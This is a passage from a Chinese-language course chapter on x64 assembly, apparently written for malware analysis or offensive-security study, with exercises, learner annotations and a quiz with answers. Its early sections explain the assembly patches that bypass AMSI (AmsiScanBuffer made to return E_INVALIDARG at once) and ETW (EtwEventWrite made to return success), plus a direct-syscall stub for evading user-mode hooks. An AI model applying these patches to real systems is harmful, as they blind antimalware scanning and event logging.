    mov [rsp+18h], rsi
    push rdi
    ...

; Patch 后（让函数直接返回"干净"）
AmsiScanBuffer:
    mov eax, 0x80070057   ; 返回 E_INVALIDARG  (函数认为参数不合法 / 扫描未进行)
    ret                   ; 直接返回
    nop                   ; 填充
    nop
    ...
```

这段代码 把 AmsiScanBuffer 这个函数“骗成”一开始就返回“没问题”，让后面的扫描逻辑根本不跑  

##### 原始函数开头在干嘛
```plain
mov [rsp+8], rbx
mov [rsp+10h], rbp
mov [rsp+18h], rsi
push rdi
```

**这些指令 ****99% 情况下只做一件事****：**

**保存现场（函数序言 / prologue）**

**意思是：**

**“我这个函数马上要用 rbx / rbp / rsi / rdi  
****先把调用者的寄存器值存起来，等函数结束再恢复”**

**这是正常、合法、编译器生成的代码。**

---

##### 为什么“改第一行就能造成巨大影响”（核心理解点）
###### 正常流程是：
```plain
进入 AmsiScanBuffer
↓
保存寄存器
↓
真正扫描 buffer 内容
↓
给出扫描结果
↓
返回
```

###### 被“截断”后的流程是：
```plain
进入 AmsiScanBuffer
↓
立刻返回一个固定结果
↓
后面所有扫描代码 = 永远不会执行
```

⚠️** 注意：  
****不是“扫描失败”，而是 ****“根本没扫描”**

---

##### `mov eax, 0x80070057` 在“语义上”意味着什么
+ `**eax**`** 是 ****Windows x64 下的返回值寄存器**
+ **返回值是一个 ****HRESULT**

`**0x80070057**`** 表示的语义是：**

**函数认为参数不合法 / 扫描未进行**

**而不是：**

+ ❌** “发现恶意”**
+ ❌** “拒绝执行”**

**很多调用方会理解为：**

**“这次扫描没成功，但不是恶意”**

##### `nop`的作用
`**nop**`** = No OPeration（什么也不做）**

CPU 执行它时：

+ 不改寄存器
+ 不改内存
+ 不改标志位  
👉 **唯一的作用：占时间 / 占位置**

 在刚才那段代码里：  

```plain
mov eax, 0x80070057
ret
nop
nop
```

这两个 `nop`**不是随便写的**。

**为什么要它？**

👉 **因为原来的代码更长**

比如原来函数开头是：

```plain
mov [rsp+8], rbx      ; 4~5 字节
mov [rsp+10h], rbp   ; 4~5 字节
mov [rsp+18h], rsi   ; 4~5 字节
push rdi             ; 1 字节
```

现在你只写了：

```plain
mov eax, imm32   ; 5 字节
ret              ; 1 字节
```

👉 **字节数对不上**

如果你不填满：

+ CPU 会继续执行后面的**残留指令**
+ 直接炸程序 💥

所以：

`nop` = **安全的“填充泡沫”**

****

把代码当成一排砖头 🧱：

+ **原来：**🧱🧱🧱🧱🧱🧱
+ **你现在只放了：**🧱🧱

**剩下的空位怎么办？**

👉** 用空气砖（nop）补齐**

---

##### `ret` 为什么是“致命一击”
`**ret**`** 的语义只有一个：**

**函数结束，把控制权还给调用者**

**所以一旦在函数入口处执行 **`**ret**`**：**

+ **后面 99% 的代码 ****全部作废**
+ **扫描逻辑 永远不会跑到**

### 6.2 ETW 绕过中的汇编
```plain
; EtwEventWrite 函数
EtwEventWrite:
    ; 原始代码...

; Patch 后
EtwEventWrite:
    xor eax, eax          ; 返回 0（成功）
    ret                   ; 直接返回 (结束函数)
```

`EtwEventWrite` 是 Windows 里的一个函数，用来：

**把事件写入 ETW（Event Tracing for Windows）系统**

ETW 是：

+ Windows 的事件/日志基础设施
+ 被系统、调试器、性能工具、EDR 使用

 这段“Patch 后”的代码的**含义**是：  
**函数一进来就假装“事情已经成功完成”，然后立刻返回**

##### 为什么是 `eax`？
**在 ****Windows x64 调用约定****里：**

+ **函数返回值放在 ****RAX**
+ **返回 **`**int / DWORD / HRESULT**`** → 看 **`**EAX**`

**所以：**

```plain
eax = 0
```

**在语义上等价于：**

```plain
return 0;
```

##### `ret`
```plain
ret
```

这条指令只干一件事：

1. 从栈顶取出返回地址
2. 跳回调用者

也就是说：

**函数立刻结束**

### 6.3 Syscall 直接调用
绕过用户态 hook 的高级技术：

```plain
; 直接调用 NtAllocateVirtualMemory syscall
mov r10, rcx              ; Windows syscall 约定
mov eax, 0x18             ; NtAllocateVirtualMemory 的 syscall 号
syscall                   ; 直接进入内核
ret
```

---

## 第七部分：实战练习
### 7.1 阅读汇编代码
分析以下代码的功能：

```plain
    xor rax, rax
    mov rcx, 10
loop_start:
    add rax, rcx
    dec rcx
    jnz loop_start
```

> rax =0 rcx =10
>
> `loop_start:` 进入循环点
>
>  第一次进来时：  rax = rcx =10 
>
> dec rcx ： RCX = RCX - 1  =9
>
> jnz loop_start : 如果 RCX ≠ 0，就跳回 loop_start   
>
> 10+9+8+...+1 = 55
>

```plain
dec rcx
jnz loop
C：
rcx--;
if (rcx != 0) {
    goto loop;
}
或者
while (--rcx != 0) {
    ...
}
```

**答案**：计算 10+9+8+...+1 = 55，结果存在 RAX

### 7.2 识别函数调用
```plain
    sub rsp, 28h          ; 分配栈空间（shadow space）
    xor rcx, rcx          ; 第1个参数 = 0
    lea rdx, [string1]    ; 第2个参数 = 字符串地址
    lea r8, [string2]     ; 第3个参数 = 字符串地址
    xor r9, r9            ; 第4个参数 = 0
    call MessageBoxA
    add rsp, 28h          ; 恢复栈
```

**这是调用 MessageBoxA(NULL, string1, string2, 0)**

> 第一段
>
> `sub a, b` 代表 a = a − b  
>
> sub rsp, 28h 代表  在栈上“空出”0x28（40）个字节的空间  
>
> `rsp`：栈顶指针（永远指着“最上面的盘子”）  
>
> `sub rsp, 28h`：  
**把栈顶往“下”挪 40 字节**
>

> **第二段**
>
> **rcx =0**
>

****

> **第三四五段：**
>
> `**lea**`** = 只算“地址”，不碰内存**
>
> ****
>
> `**mov rax, [msg]**`
>
> **意思是：**
>
> **去 内存里 找 **`**msg**`** 指向的地方，  
****把那里的“内容”读出来，放进 **`**rax**`
>
> `**lea rax, [msg]**`
>
> **意思是：**
>
> **把 **`**msg**`** 这个地址本身**** 算出来，  
****放进 **`**rax**`
>
> **没有读内存！**
>
> ** xor r9, r9            ; 第4个参数异或本身 = 0**
>

****

> 第六段
>
> `call` = “记住我从哪来 → 跳去别的地方执行”  
>
> 以`call func`为例
>
>  ① 把“返回地址”压栈  
>
> rsp = rsp - 8
>
> [rsp] = 下一条指令的地址
>
>  这一步 **和 **`**push**`** 本质一样**
>
> ** ② 跳转到 **`**func**`
>
> `**RIP = func**`
>
> ** ****开始执行函数代码  **
>

> add rsp, 28h  
>
>  是“整体丢掉一块栈空间”  
>
> `pop xxx`
>
>  是“取出一个值”  
>
>  用途完全不一样  
>

---

## 章节测试
### 选择题
1. 在 x64 Windows 中，函数的第一个参数通过哪个寄存器传递？
    - A) RAX
    - B) RBX
    - C) RCX
    - D) RDX
2. `xor rax, rax` 指令的作用是？
    - A) 将 RAX 翻倍
    - B) 将 RAX 清零
    - C) 将 RAX 取反
    - D) 无操作
3. `mov rax, [rbx]` 和 `lea rax, [rbx]` 的区别是？
    - A) 没有区别
    - B) MOV 取值，LEA 取地址
    - C) MOV 取地址，LEA 取值
    - D) LEA 更快
4. RSP 寄存器的作用是？
    - A) 存储返回值
    - B) 指向栈顶
    - C) 存储指令地址
    - D) 计数器
5. `\xcc` 在 shellcode 中通常表示什么？
    - A) NOP 指令
    - B) RET 指令
    - <font style="color:#DF2A3F;">C) INT 3 断点</font>
    - D) CALL 指令

### 代码分析题
6. 以下代码执行后，RAX 的值是多少？

```plain
mov rax, 5
mov rbx, 3
add rax, rbx
shl rax, 1
```

> shl 左移 右侧补0       shr  右移    右侧补0（无符号）    sar   右移  右侧补符号位（有符号）
>
> shl dst, n
>
> 把 dst 里的二进制整体向左移动 n 位，右边补 0
>
> rax =1000（二进制）
>
> shl rax , 1
>
> 左移一位后=10000（二进制）=16
>
>  左移 1 位 = 乘以 2  
>
> 8 * 2=16
>
>  左移 2 位 = 乘以 4 = × 2²  
>
> **右移 1 位 = ÷2**  
**右移 2 位 = ÷4**
>

7. 以下代码的功能是什么？

```plain
    push rbp
    mov rbp, rsp
    sub rsp, 20h
    ; ... 函数体 ...
    add rsp, 20h
    pop rbp
    ret
```

建立栈帧和清理栈帧

---

## 答案
1. C - x64 Windows 使用 RCX 传递第一个参数
2. B - 任何数与自己异或结果为 0
3. B - MOV 取内存中的值，LEA 取地址本身
4. B - RSP (Stack Pointer) 指向栈顶
5. C - `\xcc` 是 INT 3 指令，用于触发断点
6. 16 - (5+3)*2 = 16
7. 这是标准的函数序言和尾声，用于建立和清理栈帧

---

## 推荐资源
1. **Intel 64 and IA-32 Architectures Software Developer's Manual** - 官方参考
2. **x86 Assembly Guide** (cs.virginia.edu) - 入门教程
3. **Practical Malware Analysis** - 恶意软件分析中的汇编应用

---

## 下一步
掌握了汇编基础后，继续学习 [03-Windows架构概述.md](./03-Windows架构概述.md)，了解 Windows 操作系统的内部结构。

